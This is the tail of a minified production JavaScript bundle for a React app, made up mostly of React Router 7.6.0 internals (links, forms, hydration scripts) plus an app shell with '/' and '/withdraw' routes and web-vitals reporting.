              , o = x$()
              , {manifest: i, routeModules: s} = wK()
              , {basename: a} = mK()
              , {loaderData: c, matches: l} = bK()
              , u = _.useMemo(( () => cK(t, r, l, i, o, "data")), [t, r, l, i, o])
              , d = _.useMemo(( () => cK(t, r, l, i, o, "assets")), [t, r, l, i, o])
              , h = _.useMemo(( () => {
                if (t === o.pathname + o.search + o.hash)
                    return [];
                let e = new Set
                  , n = !1;
                if (r.forEach((t => {
                    var r;
                    let o = i.routes[t.route.id];
                    o && o.hasLoader && (!u.some((e => e.route.id === t.route.id)) && t.route.id in c && null !== (r = s[t.route.id]) && void 0 !== r && r.shouldRevalidate || o.hasClientLoader ? n = !0 : e.add(t.route.id))
                }
                )),
                0 === e.size)
                    return [];
                let l = fK(t, a);
                return n && e.size > 0 && l.searchParams.set("_routes", r.filter((t => e.has(t.route.id))).map((e => e.route.id)).join(",")),
                [l.pathname + l.search]
            }
            ), [a, c, o, i, u, r, t, s])
              , f = _.useMemo(( () => lK(d, i)), [d, i])
              , p = PK(d);
            return _.createElement(_.Fragment, null, h.map((e => _.createElement("link", (0,
            k.A)({
                key: e,
                rel: "prefetch",
                as: "fetch",
                href: e
            }, n)))), f.map((e => _.createElement("link", (0,
            k.A)({
                key: e,
                rel: "modulepreload",
                href: e
            }, n)))), p.map((e => {
                let {key: t, link: r} = e;
                return _.createElement("link", (0,
                k.A)({
                    key: t
                }, r))
            }
            )))
        }
        vK.displayName = "FrameworkContext";
        var SK = !1;
        function IK(e) {
            let {manifest: t, serverHandoffString: r, isSpaMode: n, renderMeta: o, routeDiscovery: i, ssr: s} = wK()
              , {router: a, static: c, staticContext: l} = mK()
              , {matches: u} = bK()
              , d = yK(i, s);
            o && (o.didRenderScripts = !0);
            let h = AK(u, null, n);
            _.useEffect(( () => {
                0
            }
            ), []);
            let f = _.useMemo(( () => {
                var n;
                let o = l ? "window.__reactRouterContext = ".concat(r, ";").concat("window.__reactRouterContext.stream = new ReadableStream({start(controller){window.__reactRouterContext.streamController = controller;}}).pipeThrough(new TextEncoderStream());") : " "
                  , i = c ? "".concat(null !== t.hmr && void 0 !== n && n.runtime ? "import ".concat(JSON.stringify(t.hmr.runtime), ";") : "").concat(d ? "" : "import ".concat(JSON.stringify(t.url)), ";\n").concat(h.map(( (e, r) => {
                    let n = "route".concat(r)
                      , o = t.routes[e.route.id];
                    oK(o, "Route ".concat(e.route.id, " not found in manifest"));
                    let {clientActionModule: i, clientLoaderModule: s, clientMiddlewareModule: a, hydrateFallbackModule: c, module: l} = o
                      , u = [...i ? [{
                        module: i,
                        varName: "".concat(n, "_clientAction")
                    }] : [], ...s ? [{
                        module: s,
                        varName: "".concat(n, "_clientLoader")
                    }] : [], ...a ? [{
                        module: a,
                        varName: "".concat(n, "_clientMiddleware")
                    }] : [], ...c ? [{
                        module: c,
                        varName: "".concat(n, "_HydrateFallback")
                    }] : [], {
                        module: l,
                        varName: "".concat(n, "_main")
                    }];
                    return 1 === u.length ? "import * as ".concat(n, " from ").concat(JSON.stringify(l), ";") : [u.map((e => "import * as ".concat(e.varName, ' from "').concat(e.module, '";'))).join("\n"), "const ".concat(n, " = {").concat(u.map((e => "...".concat(e.varName))).join(","), "};")].join("\n")
                }
                )).join("\n"), "\n  ").concat(d ? "window.__reactRouterManifest = ".concat(JSON.stringify(function(e, t) {
                    let {sri: r} = e
                      , n = R(e, xG)
                      , o = new Set(t.state.matches.map((e => e.route.id)))
                      , i = t.state.location.pathname.split("/").filter(Boolean)
                      , s = ["/"];
                    for (i.pop(); i.length > 0; )
                        s.push("/".concat(i.join("/"))),
                        i.pop();
                    s.forEach((e => {
                        let r = qG(t.routes, e, t.basename);
                        r && r.forEach((e => o.add(e.route.id)))
                    }
                    ));
                    let a = [...o].reduce(( (e, t) => Object.assign(e, {
                        [t]: n.routes[t]
                    })), {});
                    return (0,
                    k.A)((0,
                    k.A)({}, n), {}, {
                        routes: a,
                        sri: !!r || void 0
                    })
                }(t, a), null, 2), ";") : "", "\n  window.__reactRouterRouteModules = {").concat(h.map(( (e, t) => "".concat(JSON.stringify(e.route.id), ":route").concat(t))).join(","), "};\n\nimport(").concat(JSON.stringify(t.entry.module), ");") : " ";
                return _.createElement(_.Fragment, null, _.createElement("script", (0,
                k.A)((0,
                k.A)({}, e), {}, {
                    suppressHydrationWarning: !0,
                    dangerouslySetInnerHTML: dK(o),
                    type: void 0
                })), _.createElement("script", (0,
                k.A)((0,
                k.A)({}, e), {}, {
                    suppressHydrationWarning: !0,
                    dangerouslySetInnerHTML: dK(i),
                    type: "module",
                    async: !0
                })))
            }
            ), [])
              , p = SK ? [] : (t.entry.imports.concat(lK(h, t, {
                includeHydrateFallback: !0
            })),
            [...new Set(g)]);
            var g;
            let y = "object" === typeof t.sri ? t.sri : {};
            return SK ? null : _.createElement(_.Fragment, null, "object" === typeof t.sri ? _.createElement("script", {
                "rr-importmap": "",
                type: "importmap",
                suppressHydrationWarning: !0,
                dangerouslySetInnerHTML: {
                    __html: JSON.stringify({
                        integrity: y
                    })
                }
            }) : null, d ? null : _.createElement("link", {
                rel: "modulepreload",
                href: t.url,
                crossOrigin: e.crossOrigin,
                integrity: y[t.url],
                suppressHydrationWarning: !0
            }), _.createElement("link", {
                rel: "modulepreload",
                href: t.entry.module,
                crossOrigin: e.crossOrigin,
                integrity: y[t.entry.module],
                suppressHydrationWarning: !0
            }), p.map((t => _.createElement("link", {
                key: t,
                rel: "modulepreload",
                href: t,
                crossOrigin: e.crossOrigin,
                integrity: y[t],
                suppressHydrationWarning: !0
            }))), f)
        }
        function BK() {
            for (var e = arguments.length, t = new Array(e), r = 0; r < e; r++)
                t[r] = arguments[r];
            return e => {
                t.forEach((t => {
                    "function" === typeof t ? t(e) : null != t && (t.current = e)
                }
                ))
            }
        }
        var xK = "undefined" !== typeof window && "undefined" !== typeof window.document && "undefined" !== typeof window.document.createElement;
        try {
            xK && (window.__reactRouterVersion = "7.6.0")
        } catch (_l) {}
        function OK(e) {
            let {basename: t, children: r, window: n} = e
              , o = _.useRef();
            null == o.current && (o.current = NG({
                window: n,
                v5Compat: !0
            }));
            let i = o.current
              , [s,a] = _.useState({
                action: i.action,
                location: i.location
            })
              , c = _.useCallback((e => {
                _.startTransition(( () => a(e)))
            }
            ), [a]);
            return _.useLayoutEffect(( () => i.listen(c)), [i, c]),
            _.createElement(K$, {
                basename: t,
                children: r,
                location: s.location,
                navigationType: s.action,
                navigator: i
            })
        }
        var _K = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i
          , WK = _.forwardRef((function(e, t) {
            let r, {onClick: n, discover: o="render", prefetch: i="none", relative: s, reloadDocument: a, replace: c, state: l, target: u, to: d, preventScrollReset: h, viewTransition: f} = e, p = R(e, WG), {basename: g} = _.useContext(P$), y = "string" === typeof d && _K.test(d), m = !1;
            if ("string" === typeof d && y && (r = d,
            xK))
                try {
                    let e = new URL(window.location.href)
                      , t = d.startsWith("//") ? new URL(e.protocol + d) : new URL(d)
                      , r = a$(t.pathname, g);
                    t.origin === e.origin && null != r ? d = r + t.search + t.hash : m = !0
                } catch (_l) {
                    UG(!1, '<Link to="'.concat(d, '"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.'))
                }
            let b = function(e) {
                let {relative: t} = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                FG(B$(), "useHref() may be used only in the context of a <Router> component.");
                let {basename: r, navigator: n} = _.useContext(P$)
                  , {hash: o, pathname: i, search: s} = R$(e, {
                    relative: t
                })
                  , a = i;
                return "/" !== r && (a = "/" === i ? r : h$([r, i])),
                n.createHref({
                    pathname: a,
                    search: s,
                    hash: o
                })
            }(d, {
                relative: s
            })
              , [v,w,T] = function(e, t) {
                let r = _.useContext(vK)
                  , [n,o] = _.useState(!1)
                  , [i,s] = _.useState(!1)
                  , {onFocus: a, onBlur: c, onMouseEnter: l, onMouseLeave: u, onTouchStart: d} = t
                  , h = _.useRef(null);
                _.useEffect(( () => {
                    if ("render" === e && s(!0),
                    "viewport" === e) {
                        let e = e => {
                            e.forEach((e => {
                                s(e.isIntersecting)
                            }
                            ))
                        }
                          , t = new IntersectionObserver(e,{
                            threshold: .5
                        });
                        return h.current && t.observe(h.current),
                        () => {
                            t.disconnect()
                        }
                    }
                }
                ), [e]),
                _.useEffect(( () => {
                    if (n) {
                        let e = setTimeout(( () => {
                            s(!0)
                        }
                        ), 100);
                        return () => {
                            clearTimeout(e)
                        }
                    }
                }
                ), [n]);
                let f = () => {
                    o(!0)
                }
                  , p = () => {
                    o(!1),
                    s(!1)
                }
                ;
                return r ? "intent" !== e ? [i, h, {}] : [i, h, {
                    onFocus: TK(a, f),
                    onBlur: TK(c, p),
                    onMouseEnter: TK(l, f),
                    onMouseLeave: TK(u, p),
                    onTouchStart: TK(d, f)
                }] : [!1, h, {}]
            }(i, p)
              , A = function(e) {
                let {target: t, replace: r, state: n, preventScrollReset: o, relative: i, viewTransition: s} = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
                  , a = W$()
                  , c = x$()
                  , l = R$(e, {
                    relative: i
                });
                return _.useCallback((u => {
                    if (function(e, t) {
                        return 0 === e.button && (!t || "_self" === t) && !function(e) {
                            return !!(e.metaKey || e.altKey || e.ctrlKey || e.shiftKey)
                        }(e)
                    }(u, t)) {
                        u.preventDefault();
                        let t = void 0 !== r ? r : jG(c) === jG(l);
                        a(e, {
                            replace: t,
                            state: n,
                            preventScrollReset: o,
                            relative: i,
                            viewTransition: s
                        })
                    }
                }
                ), [c, a, l, r, n, t, e, o, i, s])
            }(d, {
                replace: c,
                state: l,
                target: u,
                preventScrollReset: h,
                relative: s,
                viewTransition: f
            });
            let E = _.createElement("a", (0,
            k.A)((0,
            k.A)((0,
            k.A)({}, p), T), {}, {
                href: r || b,
                onClick: m || a ? n : function(e) {
                    n && n(e),
                    e.defaultPrevented || A(e)
                }
                ,
                ref: BK(t, w),
                target: u,
                "data-discover": y || "render" !== o ? void 0 : "true"
            }));
            return v && !y ? _.createElement(_.Fragment, null, E, _.createElement(EK, {
                page: b
            })) : E
        }
        ));
        WK.displayName = "Link";
        var RK = _.forwardRef((function(e, t) {
            let {"aria-current": r="page", caseSensitive: n=!1, className: o="", end: i=!1, style: s, to: a, viewTransition: c, children: l} = e
              , u = R(e, RG)
              , d = R$(a, {
                relative: u.relative
            })
              , h = x$()
              , f = _.useContext(w$)
              , {navigator: p, basename: g} = _.useContext(P$)
              , y = null != f && function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
                  , r = _.useContext(T$);
                FG(null != r, "`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");
                let {basename: n} = NK("useViewTransitionState")
                  , o = R$(e, {
                    relative: t.relative
                });
                if (!r.isTransitioning)
                    return !1;
                let i = a$(r.currentLocation.pathname, n) || r.currentLocation.pathname
                  , s = a$(r.nextLocation.pathname, n) || r.nextLocation.pathname;
                return null != o$(o.pathname, s) || null != o$(o.pathname, i)
            }(d) && !0 === c
              , m = p.encodeLocation ? p.encodeLocation(d).pathname : d.pathname
              , b = h.pathname
              , v = f && f.navigation && f.navigation.location ? f.navigation.location.pathname : null;
            n || (b = b.toLowerCase(),
            v = v ? v.toLowerCase() : null,
            m = m.toLowerCase()),
            v && g && (v = a$(v, g) || v);
            const w = "/" !== m && m.endsWith("/") ? m.length - 1 : m.length;
            let T, A = b === m || !i && b.startsWith(m) && "/" === b.charAt(w), E = null != v && (v === m || !i && v.startsWith(m) && "/" === v.charAt(m.length)), P = {
                isActive: A,
                isPending: E,
                isTransitioning: y
            }, C = A ? r : void 0;
            T = "function" === typeof o ? o(P) : [o, A ? "active" : null, E ? "pending" : null, y ? "transitioning" : null].filter(Boolean).join(" ");
            let S = "function" === typeof s ? s(P) : s;
            return _.createElement(WK, (0,
            k.A)((0,
            k.A)({}, u), {}, {
                "aria-current": C,
                className: T,
                ref: t,
                style: S,
                to: a,
                viewTransition: c
            }), "function" === typeof l ? l(P) : l)
        }
        ));
        RK.displayName = "NavLink";
        var kK = _.forwardRef(( (e, t) => {
            let {discover: r="render", fetcherKey: n, navigate: o, reloadDocument: i, replace: s, state: a, method: c=J$, action: l, onSubmit: u, relative: d, preventScrollReset: h, viewTransition: f} = e
              , p = R(e, kG)
              , g = DK()
              , y = function(e) {
                let {relative: t} = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
                  , {basename: r} = _.useContext(P$)
                  , n = _.useContext(S$);
                FG(n, "useFormAction must be used inside a RouteContext");
                let[o] = n.matches.slice(-1)
                  , i = (0,
                k.A)({}, R$(e || ".", {
                    relative: t
                }))
                  , s = x$();
                if (null == e) {
                    i.search = s.search;
                    let e = new URLSearchParams(i.search)
                      , t = e.getAll("index")
                      , r = t.some((e => "" === e));
                    if (r) {
                        e.delete("index"),
                        t.filter((e => e)).forEach((t => e.append("index", t)));
                        let r = e.toString();
                        i.search = r ? "?".concat(r) : ""
                    }
                }
                e && "." !== e || !o.route.index || (i.search = i.search ? i.search.replace(/^\?/, "?index&") : "?index");
                "/" !== r && (i.pathname = "/" === i.pathname ? r : h$([r, i.pathname]));
                return jG(i)
            }(l, {
                relative: d
            })
              , m = "get" === c.toLowerCase() ? "get" : "post"
              , b = "string" === typeof l && _K.test(l);
            return _.createElement("form", (0,
            k.A)((0,
            k.A)({
                ref: t,
                method: m,
                action: y,
                onSubmit: i ? u : e => {
                    if (u && u(e),
                    e.defaultPrevented)
                        return;
                    e.preventDefault();
                    let t = e.nativeEvent.submitter
                      , r = (null === t || void 0 === t ? void 0 : t.getAttribute("formmethod")) || c;
                    g(t || e.currentTarget, {
                        fetcherKey: n,
                        method: r,
                        navigate: o,
                        replace: s,
                        state: a,
                        relative: d,
                        preventScrollReset: h,
                        viewTransition: f
                    })
                }
            }, p), {}, {
                "data-discover": b || "render" !== r ? void 0 : "true"
            }))
        }
        ));
        function MK(e) {
            return "".concat(e, " must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.")
        }
        function NK(e) {
            let t = _.useContext(v$);
            return FG(t, MK(e)),
            t
        }
        kK.displayName = "Form";
        var FK = 0
          , UK = () => "__".concat(String(++FK), "__");
        function DK() {
            let {router: e} = NK("useSubmit")
              , {basename: t} = _.useContext(P$)
              , r = V$("useRouteId");
            return _.useCallback((async function(n) {
                let o = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
                  , {action: i, method: s, encType: a, formData: c, body: l} = nK(n, t);
                if (!1 === o.navigate) {
                    let t = o.fetcherKey || UK();
                    await e.fetch(t, r, o.action || i, {
                        preventScrollReset: o.preventScrollReset,
                        formData: c,
                        body: l,
                        formMethod: o.method || s,
                        formEncType: o.encType || a,
                        flushSync: o.flushSync
                    })
                } else
                    await e.navigate(o.action || i, {
                        preventScrollReset: o.preventScrollReset,
                        formData: c,
                        body: l,
                        formMethod: o.method || s,
                        formEncType: o.encType || a,
                        replace: o.replace,
                        state: o.state,
                        fromRouteId: r,
                        flushSync: o.flushSync,
                        viewTransition: o.viewTransition
                    })
            }
            ), [e, t, r])
        }
        const LK = function() {
            return (0,
            Ae.jsxs)(OK, {
                children: [(0,
                Ae.jsx)("div", {
                    className: "App",
                    children: (0,
                    Ae.jsxs)(Z$, {
                        children: [(0,
                        Ae.jsx)($$, {
                            path: "/",
                            element: (0,
                            Ae.jsx)(IG, {})
                        }), (0,
                        Ae.jsx)($$, {
                            path: "/withdraw",
                            element: (0,
                            Ae.jsx)(BG, {})
                        })]
                    })
                }), (0,
                Ae.jsx)(Te, {})]
            })
        }
          , jK = e => {
            e && e instanceof Function && r.e(453).then(r.bind(r, 6453)).then((t => {
                let {getCLS: r, getFID: n, getFCP: o, getLCP: i, getTTFB: s} = t;
                r(e),
                n(e),
                o(e),
                i(e),
                s(e)
            }
            ))
        }
        ;
        W.createRoot(document.getElementById("root")).render((0,
        Ae.jsx)(_.StrictMode, {
            children: (0,
            Ae.jsx)(Pe, {
                children: (0,
                Ae.jsx)(LK, {})
            })
        })),
        jK()
    }
    )()
}
)();
//# sourceMappingURL=main.fa825785.js.map
